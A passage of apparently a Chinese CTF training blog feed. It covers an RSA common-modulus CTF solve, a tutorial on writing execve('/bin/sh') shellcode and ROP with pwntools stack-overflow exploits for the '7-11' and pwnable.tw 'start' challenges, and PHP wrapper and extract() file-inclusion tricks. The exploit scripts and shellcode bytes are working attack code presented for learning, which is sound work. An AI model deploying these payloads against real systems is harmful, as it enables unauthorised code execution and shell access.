&#39;n&#39;,    &#39;f&#39;: &#39;w&#39;,    &#39;g&#39;: &#39;f&#39;,    &#39;h&#39;: &#39;o&#39;,    &#39;i&#39;: &#39;x&#39;,    &#39;j&#39;: &#39;g&#39;,    &#39;k&#39;: &#39;p&#39;,    &#39;l&#39;: &#39;y&#39;,    &#39;m&#39;: &#39;h&#39;,    &#39;p&#39;: &#39;i&#39;,    &#39;q&#39;: &#39;r&#39;,    &#39;r&#39;: &#39;a&#39;,    &#39;t&#39;: &#39;s&#39;,    &#39;u&#39;: &#39;b&#39;,    &#39;v&#39;: &#39;k&#39;,    &#39;w&#39;: &#39;t&#39;,    &#39;x&#39;: &#39;c&#39;,    &#39;y&#39;: &#39;l&#39;,    &#39;z&#39;: &#39;u&#39;}f = open(&#39;encryption.encrypted&#39;, &#39;r&#39;)ans = f.read()# print ansres = &quot;&quot;for ch in ans:    flag = 0    for key, value in l1.items():        if ch == key:            res += value            flag = 1            break        else:            continue    if flag == 1:        continue    else:        res += chprint resraw_input()f = open(&#39;1.py&#39;, &#39;wb&#39;)f.write(res)f.close()</code></pre><p>还原出原来的加密脚本：</p><pre><code class="python">from gmpy2 import is_primefrom os import urandomimport base64def bytes_to_num(b):    return int(b.encode(&#39;hex&#39;), 16)def num_to_bytes(n):    b = hex(n)[2:-1]    b = &#39;0&#39; + b if len(b)%2 == 1 else b    return b.decode(&#39;hex&#39;)def get_a_prime(l):    random_seed = urandom(l)    num = bytes_to_num(random_seed)    while True:        if is_prime(num):            break        num+=1    return numdef encrypt(s, e, n):    p = bytes_to_num(s)    p = pow(p, e, n)    return num_to_bytes(p).encode(&#39;hex&#39;)def separate(n):    p = n % 4    t = (p*p) % 4    return t == 1f = open(&#39;flag.txt&#39;, &#39;r&#39;)flag = f.read()msg1 = &quot;&quot;msg2 = &quot;&quot;for i in range(len(flag)):    if separate(i): # 奇数        msg2 += flag[i]    else: # 偶数        msg1 += flag[i]p1 = get_a_prime(128)p2 = get_a_prime(128)p3 = get_a_prime(128)n1 = p1*p2n2 = p1*p3e = 0x1001c1 = encrypt(msg1, e, n1)c2 = encrypt(msg2, e, n2)print(c1)print(c2)e1 = 0x1001e2 = 0x101p4 = get_a_prime(128)p5 = get_a_prime(128)n3 = p4*p5c1 = num_to_bytes(pow(n1, e1, n3)).encode(&#39;hex&#39;)c2 = num_to_bytes(pow(n1, e2, n3)).encode(&#39;hex&#39;)print(c1)print(c2)print(base64.b64encode(num_to_bytes(n2)))print(base64.b64encode(num_to_bytes(n3)))</code></pre><p>代码看完后，思路是先用共模攻击解出 <code>n1</code>，之后利用公约数得到 <code>p1</code>、<code>p2</code>、<code>p3</code>，再求出 <code>d1</code>、<code>d2</code>，最后解出 <code>msg1</code>、<code>msg2</code>。给出的文件中，<code>ciphertext</code> 为第二次输出的 <code>c1</code> 和 <code>c2</code>，<code>n1.encrypted</code> 为第二次输出的 <code>c1</code> 和 <code>c2</code>，<code>n2&amp;n3</code>即最后输出的被加密后的<code>n2</code>和<code>n3</code>。解密脚本如下：</p><pre><code class="python">#!/usr/bin/env pythonimport base64import gmpy2f = open(&#39;n2&amp;n3&#39;, &#39;rb&#39;)n2 = f.readline()n3 = f.readline()f.close()n2 = base64.b64decode(n2).encode(&#39;hex&#39;)n3 = base64.b64decode(n3).encode(&#39;hex&#39;)n2 = int(n2, 16)n3 = int(n3, 16)# print &#39;n2:&#39;, n2# print &#39;n3:&#39;, n3# first step: solve n1e1 = 0x1001e2 = 0x101f = open(&#39;n1.encrypted&#39;, &#39;rb&#39;)n1_c1 = f.readline()n1_c2 = f.readline()f.close()n1_c1 = int(n1_c1, 16)n1_c2 = int(n1_c2, 16)# print &#39;n1_c1:&#39;, n1_c1# print &#39;n1_c2:&#39;, n1_c2gcd, s, t = gmpy2.gcdext(e1, e2)if s &lt; 0:    s = abs(s)    n1_c1 = gmpy2.invert(n1_c1, n3)if t &lt; 0:    t = abs(t)    n1_c2 = gmpy2.invert(n1_c2, n3)n1 = gmpy2.powmod(n1_c1, s, n3) * gmpy2.powmod(n1_c2, t, n3) % n3print &#39;n1:&#39;, n1# second step: solve flagf = open(&#39;ciphertext&#39;, &#39;rb&#39;)c1 = f.readline()c2 = f.readline()f.close()c1 = int(c1, 16)c2 = int(c2, 16)print &#39;c1:&#39;, c1print &#39;c2:&#39;, c2e = 0x1001p1 = gmpy2.gcd(n1, n2)p2 = n1 / p1p3 = n2 / p1d1 = gmpy2.invert(e, (p1 - 1) * (p2 - 1))d2 = gmpy2.invert(e, (p1 - 1) * (p3 - 1))m1 = pow(c1, d1, n1)m2 = pow(c2, d2, n2)msg1 = hex(m1)[2:].decode(&#39;hex&#39;)msg2 = hex(m2)[2:].decode(&#39;hex&#39;)flag = &#39;&#39;for i in range(len(msg1 + msg2)):    if i % 2 == 0:        flag += msg1[i / 2]    else:        flag += msg2[i / 2]print &#39;flag:&#39;, flag</code></pre><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://ihomura.cn/2018/07/15/WriteUp-QCTF-Xman-babymips/" target="_blank" rel="noopener">https://ihomura.cn/2018/07/15/WriteUp-QCTF-Xman-babymips/</a><br><a href="https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/" target="_blank" rel="noopener">https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/</a><br><a href="https://ihomura.cn/2018/07/15/WriteUp-QCTF-Xman-stack2/" target="_blank" rel="noopener">https://ihomura.cn/2018/07/15/WriteUp-QCTF-Xman-stack2/</a><br><a href="https://www.xmsec.cc/stackoverflow-ropbasic/" target="_blank" rel="noopener">https://www.xmsec.cc/stackoverflow-ropbasic/</a><br><a href="https://blog.csdn.net/xuchen16/article/details/81080580" target="_blank" rel="noopener">https://blog.csdn.net/xuchen16/article/details/81080580</a><br><a href="https://blog.csdn.net/xuchen16/article/details/81064079" target="_blank" rel="noopener">https://blog.csdn.net/xuchen16/article/details/81064079</a><br><a href="http://www.freebuf.com/column/177864.html" target="_blank" rel="noopener">http://www.freebuf.com/column/177864.html</a><br><a href="https://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/" target="_blank" rel="noopener">https://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/</a><br><a href="http://www.cnblogs.com/semishigure/p/9318258.html" target="_blank" rel="noopener">http://www.cnblogs.com/semishigure/p/9318258.html</a><br><a href="https://blog.csdn.net/qq_33438733/article/details/81137057" target="_blank" rel="noopener">https://blog.csdn.net/qq_33438733/article/details/81137057</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PWN入门（三）</title>
    <link href="/2018/07/11/PWN%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/2018/07/11/PWN%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>Shellcode’s Magic&amp;Basic ROP.</p><a id="more"></a><p>shellcode 是一段用于利用软件漏洞而执行的代码，以其经常让攻击者获得 shell 而得名。shellcode 常常使用机器语言编写。</p><h1 id="系统调用（int-0x80）"><a href="#系统调用（int-0x80）" class="headerlink" title="系统调用（int 0x80）"></a>系统调用（int 0x80）</h1><table><thead><tr><th style="text-align:center">NAME</th><th style="text-align:center">EAX</th><th style="text-align:center">EBX</th><th style="text-align:center">ECX</th><th style="text-align:center">EDX</th></tr></thead><tbody><tr><td style="text-align:center"><code>sys_exit</code></td><td style="text-align:center">1</td><td style="text-align:center"><code>int</code></td><td style="text-align:center">0</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center"><code>sys_read</code></td><td style="text-align:center">3</td><td style="text-align:center"><code>unsigned int</code></td><td style="text-align:center"><code>char *</code></td><td style="text-align:center"><code>size_t</code></td></tr><tr><td style="text-align:center"><code>sys_write</code></td><td style="text-align:center">4</td><td style="text-align:center"><code>unsigned int</code></td><td style="text-align:center"><code>const_char *</code></td><td style="text-align:center"><code>size_t</code></td></tr><tr><td style="text-align:center"><code>sys_open</code></td><td style="text-align:center">5</td><td style="text-align:center"><code>const char *</code></td><td style="text-align:center">int</td><td style="text-align:center"><code>int</code></td></tr><tr><td style="text-align:center"><code>sys_execve</code></td><td style="text-align:center">11</td><td style="text-align:center"><code>struct pt_regs</code></td><td style="text-align:center">0</td><td style="text-align:center">0</td></tr></tbody></table><p>PS：最常用的为 11 号调用。也就是 <code>execve(&quot;/bin/sh&quot;,0,0)</code>。</p><h1 id="编写-ShellCode"><a href="#编写-ShellCode" class="headerlink" title="编写 ShellCode"></a>编写 ShellCode</h1><p>自己编写 shellcode 的优点是灵活、可以随机应变。</p><h2 id="坏字符"><a href="#坏字符" class="headerlink" title="坏字符"></a>坏字符</h2><p>Shellcode 中存在 0x00 字节在进行利用的时候会被截断。Shellcode 如果存储在堆或是栈的内存中，这样在 shellcode 执行时就不能出现 0x00 这样的阶段字符。</p><h3 id="x00"><a href="#x00" class="headerlink" title="\x00"></a><code>\x00</code></h3><p>在执行 <code>MOV EAX,5</code> 时，相当于 <code>MOV EAX,0x00000005</code>，即会产生 <code>0x00</code>，可以使用 <code>MOV AL,5</code> 来绕过</p><h3 id="x0A"><a href="#x0A" class="headerlink" title="\x0A"></a><code>\x0A</code></h3><p>绕过可以通过 <code>!@#$%</code>。</p><h2 id="EBX-中的参数（-bin-sh）"><a href="#EBX-中的参数（-bin-sh）" class="headerlink" title="EBX 中的参数（/bin/sh）"></a>EBX 中的参数（<code>/bin/sh</code>）</h2><p>一般做法是压入栈后取 ESP：</p><pre><code class="nasm">PUSH 0x68732F2FPUSH 0x6E69622FMOV EBX,ESP</code></pre><p>前两段十六进制转换成 ascii 码是：<code>hs//nib/</code>，取 ESP 的值到 EBX 中后，EBX 的值即为：字符串 <code>&quot;/bin//sh&quot;</code> 的首地址。</p><p><img src="/pics/BIN集训/PWN/三/1.png" srcset="/img/loading.gif" alt></p><p>PS：在多级目录下，多个斜杠是对路径没有影响的。</p><p><img src="/pics/BIN集训/PWN/三/2.png" srcset="/img/loading.gif" alt></p><h2 id="nasm-反汇编工具下载"><a href="#nasm-反汇编工具下载" class="headerlink" title="nasm 反汇编工具下载"></a>nasm 反汇编工具下载</h2><p>Netwide Assembler 是一款基于英特尔 x86 架构的汇编与反汇编工具。它可以用来编写 16 位、32 位（IA-32）和 64 位（x86-64）的程序。 NASM 被认为是 Linux 平台上最受欢迎的汇编工具之一。</p><h3 id="sudo-apt-get-install-nasm-报错"><a href="#sudo-apt-get-install-nasm-报错" class="headerlink" title="sudo apt-get install nasm 报错"></a><code>sudo apt-get install nasm</code> 报错</h3><p>记录一下无法下载时的解决方法。</p><ol><li>使用 <code>ps -A | grep apt</code>命令来找出所有 <code>apt</code> 进程。</li><li>使用 <code>sudo kill -9 {进程编号}</code> 来逐个杀死进程。</li></ol><p><img src="/pics/BIN集训/PWN/三/3.png" srcset="/img/loading.gif" alt></p><p>结束所有进程后即可下载。</p><h2 id="完整编写过程"><a href="#完整编写过程" class="headerlink" title="完整编写过程"></a>完整编写过程</h2><p>写入文件 <code>shellcode.asm</code>：</p><pre><code class="asm">Section .text    global _start_start:    xor ecx,ecx    mul ecx    push ecx    push 0x68732f2f    push 0x6e69622f    mov ebx,esp    mov al,0xb    int 0x80</code></pre><p>PS：关于这两条指令：<code>XOR ECX,ECX =&gt; MUL ECX</code>，经过测试，会先将 ECX 中的值置零，然后 EAX、EDX 中的值也都会变为零。</p><p><img src="/pics/BIN集训/PWN/三/4.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/BIN集训/PWN/三/5.png" srcset="/img/loading.gif" alt></p><p>执行命令：<code>nasm -f elf shellcode.asm -o shellcode.o</code> 后，使用 <code>objdump</code> 命令对 <code>shellcode.o</code> 进行反汇编：<code>objdump -d shellcode.o</code>。</p><p><img src="/pics/BIN集训/PWN/三/6.png" srcset="/img/loading.gif" alt></p><p>将十六进制部分记录下来，就构成了一条 shellcode：<code>\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80</code>。</p><h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><p>面向返回编程（Return-Oriented Programming）是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。攻击者控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列（称为 Gadgets）。每一段 gadget 通常结束于 return 指令，并位于共享库代码中的子程序。系列调用这些代码，攻击者可以在拥有更简单攻击防范的程序内执行任意操作。</p><h2 id="相关保护机制"><a href="#相关保护机制" class="headerlink" title="相关保护机制"></a>相关保护机制</h2><p>NX 即 No-eXecute（不可执行）的意思，NX（类似于 windows 下的 DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令。</p><p>PS：</p><ul><li style="list-style: none"><input type="checkbox" checked> No eXecute（NX） =&gt; linux</li><li style="list-style: none"><input type="checkbox" checked> Data Execution Prevention（DEP） =&gt; windows</li></ul><p>也就是说：“可执行不可写，可写不可执行。”</p><h1 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h1><p>Address Space Layout Randomization（地址空间布局随机化），该技术在 2005 年的 kernel2.6.12 中被引入到 Linux 系统，它将进程的某些内存空间地址进行随机化来增大入侵者预测目的地址的难度，从而降低进程被成功入侵的风险。当前 Linux、Windows 等主流操作系统都已经采用该项技术。</p><p>分级：</p><ul><li>0：没有随机化。即关闭 ASLR。</li><li>1：保留的随机化。共享库、栈、<code>mmap()</code> 以及 VDSO 将被随机化。</li><li>2：完全的随机化。在 1 的基础上，通过 <code>brk()</code> 分配的内存空间也将被随机化。</li></ul><p>PS：</p><ul><li style="list-style: none"><input type="checkbox" checked> ASLR 并不负责 BSS 段、代码段（文本段）和数据段（DATA 段）的随机化。</li><li style="list-style: none"><input type="checkbox" checked> 堆栈空间被完全随机化。</li></ul><h1 id="7-11"><a href="#7-11" class="headerlink" title="7-11"></a>7-11</h1><p>源码：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void A(){    setvbuf(stdout, 0, _IONBF, 0);    srand(time(0) ^ getpid());    char buf[100];    gets(buf);    int magic = rand();    if (atoi(buf) == magic) {        puts(&quot;Okay...&quot;);        system(&quot;sh&quot;);    }}int main(){    A();}</code></pre><p>这道题和之前的一题很类似，但是将 buf 和 magic 两个变量的位置进行了调换，所以无法通过直接覆盖 magic 的值来 getshell。（当然还有一种方法时直接获得 <code>system(&quot;sh&quot;);</code> 的地址来 getshell）</p><h2 id="简单难度"><a href="#简单难度" class="headerlink" title="简单难度"></a>简单难度</h2><p>此时 ASLR 是关闭的。</p><p><img src="/pics/BIN集训/PWN/三/7.png" srcset="/img/loading.gif" alt></p><p>基本的想法是先填入 shellcode，然后通过 ret 的偏移量来跳转到 shellcode 的首地址，执行 <code>execve(&quot;/bin/sh&quot;,0,0)</code> 来 getshell。</p><p>shellcode 在之前已经写好了，偏移量也可以通过之前缓冲区溢出的方法来得到。</p><p><img src="/pics/BIN集训/PWN/三/8.png" srcset="/img/loading.gif" alt></p><p>最后应该如何获得 shellcode 的首地址？可以通过如下 payload 来获取。</p><pre><code class="python"># test.pyfrom pwn import *p = process(&#39;./7-11&#39;)raw_input() # 相当于设下断点shellcode=p32(0xdeadbeef)+&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;addr=p32(0x12345678)offset=116payload=shellcode+(offset-len(shellcode))*&#39;A&#39;+addrp.sendline(payload)p.interactive()</code></pre><p>这里在 shellcode 前加上“0xdeadbeef”，是为了之后在调试时更方便地找到首地址。<code>raw_input()</code> 要求输入值，可以使程序在运行时终止，相当于一个断点。</p><p>运行 test.py，会得到该程序的 PID，用 gdb 的 attach 命令执行它。</p><p><img src="/pics/BIN集训/PWN/三/9.png" srcset="/img/loading.gif" alt></p><p>在运行程序处随便输入值，然后在 gdb 中用 finish 命令使程序执行到 <code>gets()</code> 函数结束，再用 searchmem 命令查找“0xdeadbeef”的地址，即得到 shellcode 的首地址。</p><p><img src="/pics/BIN集训/PWN/三/10.png" srcset="/img/loading.gif" alt></p><p>最后的 exp 如下：</p><pre><code class="python"># 7-11.pyfrom pwn import *p = process(&#39;./7-11&#39;)shellcode=&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;addr=p32(0xffffcfa8)offset=116# payload=shellcode+(offset-len(shellcode))*&#39;A&#39;+addrpayload=shellcode.ljust(offset,&#39;A&#39;)+addrp.sendline(payload)p.interactive()</code></pre><h2 id="中等难度"><a href="#中等难度" class="headerlink" title="中等难度"></a>中等难度</h2><p>通过命令 <code>sudo sh -c &quot;echo 2 &gt; /proc/sys/kernel/randomize_va_space&quot;</code>，打开 ASLR。</p><p>通过之前的了解，当 ASLR 开启时，堆栈的地址是随机的，而 BSS 的地址是不变的，那么通过 BSS 段可以做一些文章。</p><p>PS：BSS（Block Started by Symbol）通常是指用来存放程序中未初始化的全局变量和静态变量的一块内存区域。其特点是可读写，且在程序执行之前会自动清 0。</p><p>总体的思路是利用 BSS 段地址不变的特性，构造 payload：<code>payload=offset*&#39;A&#39;+p32(gets_addr)+p32(bss+0x100)+p32(bss+0x100)</code>（因为 BSS 段开头部分可能存储一些重要数据，故增加 0x100 来避免影响程序）。第一个 BSS 首地址表示 <code>gets()</code> 的返回地址，第二个 BSS 首地址表示 <code>gets()</code> 的参数。</p><p>那么通过 payload 可知，程序执行时会重新返回到 <code>gets()</code> 函数处，调用函数时，相当于先 <code>Push retaddr</code> 再 <code>Jump</code>，即第一个 BSS 首地址为函数返回地址，再输入 shellcode 作为函数参数，即第二个 BSS 首地址。</p><p>使用 gdb 对程序调试，用 vmmap 命令查看 bss 段：</p><p><img src="/pics/BIN集训/PWN/三/11.png" srcset="/img/loading.gif" alt></p><p>记录下 bss 段地址。通过 <code>objdump -d</code> 查看 <code>gets()</code> 函数地址：</p><p><img src="/pics/BIN集训/PWN/三/12.png" srcset="/img/loading.gif" alt></p><p>两个地址都搞定后，那么就可以写出 exp 了：</p><pre><code class="python">from pwn import *# p = remote(&#39;10.21.13.88&#39;,1025)p = process(&#39;./7-11&#39;)shellcode=&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;offset=116bss=0x0804a000gets_addr=0x08048400payload=offset*&#39;A&#39;+p32(gets_addr)+p32(bss+0x100)+p32(bss+0x100)p.sendline(payload)# gdb.attach(p,&#39;&#39;&#39;# &#39;&#39;&#39;) //在运行脚本时可以直接打开gdb进行调试p.sendline(shellcode)p.interactive()</code></pre><h1 id="pwnable-tw-start"><a href="#pwnable-tw-start" class="headerlink" title="pwnable.tw-start"></a>pwnable.tw-start</h1><p>checksec 一下，发现保护都没开：</p><pre><code>[*] &#39;/home/assassinq/Desktop/start&#39;    Arch:     i386-32-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)</code></pre><p>反编译出来只有 <code>_start</code> 和 <code>_exit</code>，应该是个汇编程序。可以通过<a href="http://syscalls.kernelgrok.com/" target="_blank" rel="noopener">系统调用</a>判断出调用的函数：</p><pre><code class="asm">./start:     file format elf32-i386Disassembly of section .text:08048060 &lt;_start&gt;: 8048060:       54                      push   esp 8048061:       68 9d 80 04 08          push   0x804809d 8048066:       31 c0                   xor    eax,eax 8048068:       31 db                   xor    ebx,ebx 804806a:       31 c9                   xor    ecx,ecx 804806c:       31 d2                   xor    edx,edx 804806e:       68 43 54 46 3a          push   0x3a465443 8048073:       68 74 68 65 20          push   0x20656874 8048078:       68 61 72 74 20          push   0x20747261 804807d:       68 73 20 73 74          push   0x74732073 8048082:       68 4c 65 74 27          push   0x2774654c 8048087:       89 e1                   mov    ecx,esp 8048089:       b2 14                   mov    dl,0x14 804808b:       b3 01                   mov    bl,0x1 804808d:       b0 04                   mov    al,0x4 ; sys_write 804808f:       cd 80                   int    0x80 8048091:       31 db                   xor    ebx,ebx 8048093:       b2 3c                   mov    dl,0x3c 8048095:       b0 03                   mov    al,0x3 ; sys_read 8048097:       cd 80                   int    0x80 8048099:       83 c4 14                add    esp,0x14 804809c:       c3                      ret0804809d &lt;_exit&gt;: 804809d:       5c                      pop    esp 804809e:       31 c0                   xor    eax,eax 80480a0:       40                      inc    eax 80480a1:       cd 80                   int    0x80</code></pre><p>具体寄存器的值与系统调用的关系：</p><table><thead><tr><th style="text-align:center">寄存器</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">eax</td><td style="text-align:center">中断类型号</td></tr><tr><td style="text-align:center">ebx</td><td style="text-align:center">STDIN/STDOUT</td></tr><tr><td style="text-align:center">ecx</td><td style="text-align:center">字符串地址</td></tr><tr><td style="text-align:center">edx</td><td style="text-align:center">字符串长度</td></tr></tbody></table><p>因为栈是可执行的并且开启了 ASLR。我们的想法就是通过泄漏栈地址，然后填入 shellcode，跳转过去 getshell。</p><p>exp 如下：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *local = 1if local:    p = process(&#39;./start&#39;)else:    p = remote(&#39;139.162.123.119&#39;, 10000)write = 0x8048087# gdb.attach(p)offset = 20payload = &#39;A&#39; * offset + p32(write)p.sendafter(&#39;CTF:&#39;, payload)stack = u32(p.recv(4)) + 0x10print &#39;stack:&#39;, hex(stack)sh = open(&#39;sh.bin&#39;).read()payload = &#39;A&#39; * 20 + p32(stack + 4) + shp.send(payload)p.interactive()</code></pre><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://linux.cn/article-8040-1.html" target="_blank" rel="noopener">https://linux.cn/article-8040-1.html</a><br><a href="http://bestwing.me/2017/03/19/stack-overflow-two-ROP/" target="_blank" rel="noopener">http://bestwing.me/2017/03/19/stack-overflow-two-ROP/</a><br><a href="https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener">https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a><br><a href="https://blog.csdn.net/white_eyes/article/details/7169199" target="_blank" rel="noopener">https://blog.csdn.net/white_eyes/article/details/7169199</a><br><a href="https://b3t4m3ee.github.io/2018/07/10/Shellcode-s-Magic/" target="_blank" rel="noopener">https://b3t4m3ee.github.io/2018/07/10/Shellcode-s-Magic/</a><br><a href="https://blog.csdn.net/Plus_RE/article/details/79199772" target="_blank" rel="noopener">https://blog.csdn.net/Plus_RE/article/details/79199772</a><br><a href="http://showlinkroom.me/2017/01/22/pwnable-tw/" target="_blank" rel="noopener">http://showlinkroom.me/2017/01/22/pwnable-tw/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WEB入门（五）</title>
    <link href="/2018/07/10/WEB%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%94%EF%BC%89/"/>
    <url>/2018/07/10/WEB%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%94%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>PHP 伪协议和文件包含。</p><a id="more"></a><h1 id="PHP-伪协议"><a href="#PHP-伪协议" class="headerlink" title="PHP 伪协议"></a>PHP 伪协议</h1><p>不是指网络上的<strong>TCP/IP 协议</strong>，而是操作系统提供支持的一种协议，类似标准协议 HTTP、FTP。自定义协议叫做伪协议。</p><p>伪协议格式：<code>zzz://xxxxxx</code>。</p><h2 id="PHP-伪协议总和"><a href="#PHP-伪协议总和" class="headerlink" title="PHP 伪协议总和"></a>PHP 伪协议总和</h2><table><thead><tr><th style="text-align:center">形式</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">file://</td><td style="text-align:center">访问本地文件系统</td></tr><tr><td style="text-align:center">http://</td><td style="text-align:center">访问 HTTP(s) 网址</td></tr><tr><td style="text-align:center">ftp://</td><td style="text-align:center">访问 FTP(s) URLs</td></tr><tr><td style="text-align:center"><strong>php://</strong></td><td style="text-align:center"><strong>访问各个输入/输出（I/Ostreams）</strong></td></tr><tr><td style="text-align:center"><strong>zlib://</strong></td><td style="text-align:center"><strong>压缩流</strong></td></tr><tr><td style="text-align:center"><strong>data://</strong></td><td style="text-align:center"><strong>数据（RFC 2397）</strong></td></tr><tr><td style="text-align:center">glob://</td><td style="text-align:center">查找匹配的文件路径模式</td></tr><tr><td style="text-align:center"><strong>phar://</strong></td><td style="text-align:center"><strong>PHP 归档</strong></td></tr><tr><td style="text-align:center">ssh2://</td><td style="text-align:center">Secure Shell 2</td></tr><tr><td style="text-align:center"><strong>rar://</strong></td><td style="text-align:center"><strong>RAR</strong></td></tr><tr><td style="text-align:center">ogg://</td><td style="text-align:center">音频流</td></tr><tr><td style="text-align:center">expect://</td><td style="text-align:center">处理交互式的流</td></tr></tbody></table><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ul><li><code>allow_url_fopen</code>：能否远程文件包含</li><li><code>allow_url_include</code>：能否使用伪协议</li></ul><h1 id="PHP-伪协议应用"><a href="#PHP-伪协议应用" class="headerlink" title="PHP 伪协议应用"></a>PHP 伪协议应用</h1><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a><code>php://filter</code></h2><p>形式：<code>?file=php://filter/convert.base64-encode/resource=xxx.php</code></p><p><code>php://filter</code> 是一种元封装器，设计用于“数据流打开”时的“筛选过滤”应用，对本地磁盘文件进行读写。简单来讲就是可以在执行代码前将代码换个方式读取出来，只是读取，不需要开启 <code>allow_url_include</code>。</p><h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a><a href="http://4.chinalover.sinaapp.com/web7/index.php" target="_blank" rel="noopener">应用</a></h3><p>点击跳转页面后，通过伪协议读取源码：</p><p><img src="/pics/WEB集训/五/1.png" srcset="/img/loading.gif" alt></p><p>源码解密后得到 flag：</p><p><img src="/pics/WEB集训/五/2.png" srcset="/img/loading.gif" alt></p><h2 id="变量覆盖漏洞（extract-）"><a href="#变量覆盖漏洞（extract-）" class="headerlink" title="变量覆盖漏洞（extract()）"></a>变量覆盖漏洞（<code>extract()</code>）</h2><p><code>int extract(array &amp;$var_array, int $extract_type = EXTR_OVERWRITE, string $prefix = null)</code></p><p><code>extract()</code> 函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p><p>第二个参数 <code>type</code> 用于指定当某个变量已经存在，而数组中又有同名元素时，<code>extract()</code> 函数如何对待这样的冲突。该函数返回成功导入到符号表中的变量数目。</p><p><code>extract_rules</code> 的默认值为 <code>EXTR_OVERWRITE</code>，表示如果有冲突，则覆盖已有的变量。</p><h3 id="应用（lianxi-input1）"><a href="#应用（lianxi-input1）" class="headerlink" title="应用（lianxi-input1）"></a>应用（lianxi-input1）</h3><p>源码：</p><pre><code class="php">&lt;?php$flag=&#39;xxxxx&#39;;extract($_GET);if(isset($shiyan){    $content=trim($flag);    if($shiyan==$content)       echo&#39;flag{......}&#39;;    else       echo&#39;Oh.no&#39;;}?&gt;</code></pre><p>通过 <code>extract()</code> 变量覆盖，构造 <code>?shiyan=1&amp;flag=1</code> 得到 flag。</p><p><img src="/pics/WEB集训/五/3.png" srcset="/img/loading.gif" alt></p><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a><code>file_get_contents()</code></h2><p><code>file_get_contents()</code> 函数把整个文件读入一个字符串中。</p><h3 id="应用（lianxi-data）"><a href="#应用（lianxi-data）" class="headerlink" title="应用（lianxi-data）"></a>应用（lianxi-data）</h3><p>源码：</p><pre><code class="php">&lt;?php$user=$_GET[&#39;user&#39;];#echo $user;if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)===&#39;the user is admin&#39;))    echo &quot;flag{xxxxxxxxxxxxx}&quot;;else    echo &quot;you are not admin ! &quot;;?&gt;</code></pre><p>分别通过 GET 和 POST 两种方式获得 flag：</p><p><img src="/pics/WEB集训/五/4.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/WEB集训/五/5.png" srcset="/img/loading.gif" alt></p><h2 id="应用四"><a href="#应用四" class="headerlink" title="应用四"></a><a href="http://level3.tasteless.eu/index.php" target="_blank" rel="noopener">应用四</a></h2><p>先根据提示查看 <code>php.ini</code> 配置情况</p><p><img src="/pics/WEB集训/五/6.png" srcset="/img/loading.gif" alt></p><p>发现可以通过伪协议来执行代码，先获得根路径：</p><p><img src="/pics/WEB集训/五/7.png" srcset="/img/loading.gif" alt></p><p>再通过 <code>scandir()</code> 函数来扫根路径就能找到 flag 路径，直接访问就得到 flag。</p><p><img src="/pics/WEB集训/五/8.png" srcset="/img/loading.gif" alt></p><h2 id="eval-闭合漏洞"><a href="#eval-闭合漏洞" class="headerlink" title="eval() 闭合漏洞"></a><code>eval()</code> 